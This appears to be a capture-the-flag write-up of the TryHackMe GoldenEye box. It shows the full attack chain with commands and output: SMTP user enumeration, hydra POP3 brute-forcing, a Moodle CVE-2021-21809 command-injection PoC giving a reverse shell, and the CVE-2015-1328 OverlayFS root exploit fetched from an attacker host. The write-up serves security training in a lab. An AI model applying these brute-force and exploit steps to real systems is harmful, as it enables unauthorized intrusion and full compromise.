---
title: "GoldenEye"
date: 2026-09-30
categories: [TryHackMe, Medium]
tags: [linux, apache, smtp, postfix, pop3, dovecot, smtp user enumeration, html entity encoding, basic auth, hydra, password brute force, credential reuse, moodle, cve-2021-21809, RCE, exiftool, metadata, kernel exploit, cve-2015-1328, OverlayFS, privilege escalation, nmap, curl, python, gobuster, netcat, searchsploit, cc]
image:
  path: /assets/img/THM/GoldenEye/banner.webp
  lqip: "data:image/webp;base64,UklGRuwCAABXRUJQVlA4WAoAAAAQAAAAHwAAHwAAQUxQSFACAAABoHNr27HNXdDzqZvOtmd6W52t2HZS2bYzNmJ7bNvGxwevHt73dRQP3kTEBKiMwUWlM6NvXPTIXLhOdu9yg5BVqHOQLNZll3KvhGStrRWkjPAqGfU1k/ILdUiKvppHyhFMK01fKyKUV1ckUbiRR0gUSYMbQYLQZCH8n9d1Al4tQrJvN9Sm6eskN0Qk6qJp5r0oTaV4DnEp2CVN5tBMclQssF1AJE2o/RoNRA5AydYoDWidVn8XAgQuQskhLhFZ3Qc1CJtz4Fug9i//9PPFy9b+liI8bCEiiwPE1JQ2fnmsiIT5y0iC4oUjaErLoFjCdsG8YgN8gEr65hsirKWQl5y755NV//6z/MNffIYfRwNC3Yco7K9xLofWhRZdeg9baDs/vLxx2606AtB8VS8EH3FiB/kZo7f2NKo+O0r+K5a8Q5Rw+BsiPnQvbn7xDmMlq0Y2773jZ2jkwW0oQPOppflmR7DSMCo+CO4a18Z45eC/mGLfegMdO/UVuu49Xq+uqdhKC6OicjaLLAtO3OOKgGblRlh27Cujxtjww7H2VRXPuAe/t4jY/LhCg1KvHaT48b4OFc3WG2/dVmksvxB+ZCERfz3toxApPrsRZ+3bFRMXV8951xh4eDefWwgRGx+vRYngvfa+zYHJUwYYbefP+/PUHlbGUBx7cguIhj+f+XT30aX3Txi48NvCn9fYkICi8MnCq4CCfSsXfrv9XO3qo/4q4RuH9Au//H3WI9nb+OkZ/jgJq294rhd3i8KVjRu+/e/slTP/fvTqN3k5v9IvlRYCVlA4IHYAAAAQBACdASogACAAPuFipE2opiOiN/VYARAcCWYArAAX7t3E+AEsFCqAAAD+8HVzTo4vzrG7lGWWJD3oZXL4u9hIjjvyjHi2jHNa7Qe8Qj3/6ACCMQ600/31Q57kT6jAYHLAVCjq1//roHYywLBvz9rfzI5PnAAA"
  alt: GoldenEye writeup
---

GoldenEye is a Medium Linux box from TryHackMe themed on the Bond film, and it earns the rating with a long enumeration trail rather than a single clever bug. An encoded password hidden in a page's JavaScript opens a basic-auth area; SMTP confirms which users are real; and a chain of POP3 mailboxes — each brute-forced, each holding the next set of credentials — leads through a Moodle training site to its administrator. From there, **CVE-2021-21809** (a Moodle spell-checker command injection) gives a shell as `www-data`, and an ancient kernel falls to the **CVE-2015-1328** OverlayFS exploit for root.

| Field      | Details    |
|------------|------------|
| Platform   | TryHackMe  |
| Difficulty | Medium     |
| OS         | Linux      |
| IP         | 10.129.152.40 |
| Date       | September 2026 |

## Tools Used

| Tool         | Description                                                            |
|--------------|-----------------------------------------------------------------------|
| nmap         | Network port scanner and service fingerprinter                        |
| curl         | Fetched pages and authenticated to the basic-auth area                |
| python3      | Decoded the HTML-entity-encoded password from the page source         |
| gobuster     | Directory brute-forcer against the authenticated `/sev-home/` area    |
| netcat (nc)  | Manual SMTP `VRFY` user enumeration and POP3 mailbox reading          |
| hydra        | POP3 password brute-force for boris, natalya and doak                 |
| exiftool     | Read the admin password hidden in a JPEG's EXIF metadata              |
| searchsploit | Found the Moodle and OverlayFS exploits in Exploit-DB                 |
| CVE-2021-21809 PoC | Moodle TinyMCE spell-checker RCE used for the foothold          |
| cc           | Compiled the OverlayFS kernel exploit (no `gcc` on the target)        |

## Reconnaissance & Enumeration

### Port Scan

```bash
sudo nmap -p- -sCV -Pn -n 10.129.152.40 -oN nmap
```

```bash
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ...
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
55007/tcp open  pop3     Dovecot pop3d
```

Four services, and the shape is unusual: a mail stack (**SMTP** on 25, **POP3** on the deliberately non-standard **55007**) alongside a web server. The `VRFY` verb advertised by SMTP is a gift for user enumeration, and a POP3 service almost always means credentials will be the currency on this box.

### Web — The Admin Server and an Encoded Password

The landing page is a themed terminal animation driven by `terminal.js`:

![The GoldenEye Primary Admin Server landing page with its animated terminal text](/assets/img/THM/GoldenEye/cap1.png)

Reading the source of `terminal.js` turns up a developer comment addressed to "Boris", telling him to change his default password — and helpfully leaving the current one, "encoded", as a string of numeric HTML entities:

```text
//I encoded you p@ssword below...
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;...
```

Each `&#NN;` is a decimal HTML character reference, so decoding is just mapping each number back to its ASCII character:

```python
enc = "&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;"
print("".join(chr(int(n)) for n in enc.strip(";").split(";") if n))
# InvincibleHack3r
```

The page also tells us to visit `/sev-home/`, which is protected by HTTP basic auth — and `boris:InvincibleHack3r` gets in:

![The browser's HTTP basic-auth prompt for the /sev-home/ area](/assets/img/THM/GoldenEye/cap2.png)

![The /sev-home/ GoldenEye operators page after authenticating as boris](/assets/img/THM/GoldenEye/cap3.png)

An HTML comment at the bottom of that page names two "GoldenEye Network Operator Supervisors" — **Natalya** and **Boris** — and the copy hints (in-character) that POP3 is running on a high non-default port. A quick authenticated directory scan of `/sev-home/` finds nothing more, so the mail service is the next move.

### SMTP User Enumeration

Postfix still answers `VRFY`, which confirms whether a local mailbox exists — perfect for turning the two names into verified accounts:

```bash
nc -nv 10.129.152.40 25
```

```bash
VRFY boris
252 2.0.0 boris
VRFY natalya
252 2.0.0 natalya
VRFY ander
550 5.1.1 <ander>: Recipient address rejected: User unknown
```

`boris` and `natalya` are real; a made-up name is rejected. The encoded password does *not* work on POP3, so with valid usernames in hand, a small-wordlist brute-force against POP3 is the play (SMTP itself advertises no `AUTH`, so there's nothing to brute-force there):

```bash
hydra -l boris -P passwordsList.txt -s 55007 -f -t 4 10.129.152.40 pop3
# [55007][pop3] login: boris   password: secret1!
```

### The POP3 Credential Trail

Logging into Boris's mailbox and reading his messages is pure flavour (a note from `alec@janus.boss` about hiding access codes), but the same brute-force against **natalya** succeeds with `bird`, and *her* inbox is where the trail really starts:

```bash
hydra -l natalya -P passwordsList.txt -s 55007 -f -t 4 10.129.152.40 pop3
# [55007][pop3] login: natalya   password: bird
```

Natalya's second message hands over a new set of credentials and an internal domain:

```text
Ok, user creds are:
username: xenia
password: RCP90rulez!

And if you didn't have the URL on our internal Domain:
severnaya-station.com/gnocertdir
Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

Adding the vhost to `/etc/hosts` makes the training site reachable:

```bash
echo "10.129.152.40 severnaya-station.com" | sudo tee -a /etc/hosts
```

## The Moodle Training Site

`severnaya-station.com/gnocertdir` is a **Moodle 2.2.3** install, and `xenia:RCP90rulez!` logs in:

![The GNO certification Moodle login at severnaya-station.com/gnocertdir](/assets/img/THM/GoldenEye/cap4.png)

Moodle 2.2.3 is vulnerable to **CVE-2021-21809**, but exploiting it needs the *administrator* account to reach the spell-checker settings — so the goal shifts to escalating within the application. Browsing as Xenia, a message thread names another user, **doak**:

![A Moodle message conversation as xenia that reveals the user doak](/assets/img/THM/GoldenEye/cap5.png)

The same POP3 brute-force works on `doak` (`goat`), and his mailbox yields the training-site login `dr_doak:4England!`. Logged into Moodle as Dr Doak, his private files hold a `s3cret.txt` pointing at a hidden image:

![Dr Doak's private files in Moodle, containing s3cret.txt](/assets/img/THM/GoldenEye/cap6.png)

```text
I was able to capture this apps adm1n cr3ds through clear txt.
Something juicy is located here: /dir007key/for-007.jpg
```

### The Admin Password in EXIF

The image itself looks unremarkable, but the administrator password is tucked into its metadata rather than its pixels:

![The for-007.jpg image retrieved from /dir007key/](/assets/img/THM/GoldenEye/cap7.png)

```bash
wget http://severnaya-station.com/dir007key/for-007.jpg
exiftool for-007.jpg
```

```bash
Image Description  : eFdpbnRlcjE5OTV4IQ==
```

The `Image Description` field is base64, and it decodes to the Moodle administrator's password:

```bash
echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
# xWinter1995x!
```

## Initial Access — CVE-2021-21809 (Moodle Spell-Checker RCE) as `www-data`

Logged into Moodle as `admin:xWinter1995x!`, the spell-checker route is now reachable. **CVE-2021-21809** abuses the TinyMCE spell-checker: Moodle runs an external `aspell` binary whose path is an admin-controlled setting, so pointing that "path" at a shell command and then triggering the spell-check RPC executes it on the server. The two settings changes are switching the spell engine to **PSpellShell** and writing the payload into the aspell path:

![The Moodle TinyMCE editor settings, switching the spell engine to PSpellShell](/assets/img/THM/GoldenEye/cap8.png)

A public PoC (anldori's `CVE-2021-21809`) automates the whole sequence — login, read the session key, set both settings, then hit `rpc.php` to fire the payload. It needs a session that persists across the requests (a `requests.Session()`), the admin credentials, and a listener; the payload is a `telnet`-based reverse shell since the target is minimal:

```bash
python3 CVE-2021-21809.py
# Login successfully.
# Changed spell check to PSpellShell.
# Payload sent.
```

```bash
nc -nvlp 4444
```

```bash
Connection received on 10.129.152.40
whoami
www-data
```

## Privilege Escalation — `www-data` → `root` (CVE-2015-1328 OverlayFS)

After the usual TTY upgrade, the kernel version is the whole privilege-escalation story:

```bash
www-data@ubuntu:/$ uname -r
3.13.0-32-generic
```

That kernel is vulnerable to **CVE-2015-1328**, the OverlayFS local privilege escalation — a flaw in how OverlayFS handled file permissions across mount namespaces, exploitable for arbitrary root code execution. Exploit-DB ships a ready C exploit (37292):

```bash
searchsploit -m linux/local/37292.c
```

The target has no `gcc`, only `cc`, so the one line in the exploit that compiles a helper library needs adjusting before it will build on the box:

```c
// original
lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
// edited
lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

Transferring it over a quick HTTP server, compiling with `cc`, and running it drops a root shell:

```bash
www-data@ubuntu:/tmp$ curl -s http://<ATTACKER_IP>:8000/37292.c -o exploit.c
www-data@ubuntu:/tmp$ cc exploit.c -o exploit && ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# cat /root/.flag.txt
REDACTED
```

## Flags

| Flag       | Value      |
|------------|------------|
| `/root/.flag.txt` | `REDACTED` |

## Key Takeaways

- **"Encoded" is not "encrypted".** The first password was hidden only behind decimal HTML entities — a reversible representation, not a cipher. Anything a browser can decode on its own, an attacker can decode instantly; obfuscation in client-side source buys nothing.
- **`VRFY` turns guesses into facts.** SMTP happily confirmed which usernames were real, so the brute-force only ever ran against accounts that existed — enumeration first, then a tiny wordlist, is far more effective than blasting a big list at unknown users.
- **A credential trail is only as strong as its weakest reused password.** Every hop here — boris → natalya → doak → dr_doak → admin — came from a mailbox or a message readable with the previous account's password. Passwords stored and mailed in cleartext turned one weak POP3 password into full application admin.
- **Metadata is data.** The admin password lived in a JPEG's `Image Description` EXIF field, invisible in the image but one `exiftool` away. Files exfiltrated during an assessment deserve a metadata pass, not just a look at their contents.
- **An old kernel is a root shell waiting to happen.** Once on the box, `uname -r` alone decided the escalation: kernel 3.13 maps straight to CVE-2015-1328. Keeping a public-facing host on a years-old kernel makes every foothold, however limited, a full compromise — and a missing `gcc` only means editing one line to use `cc`.
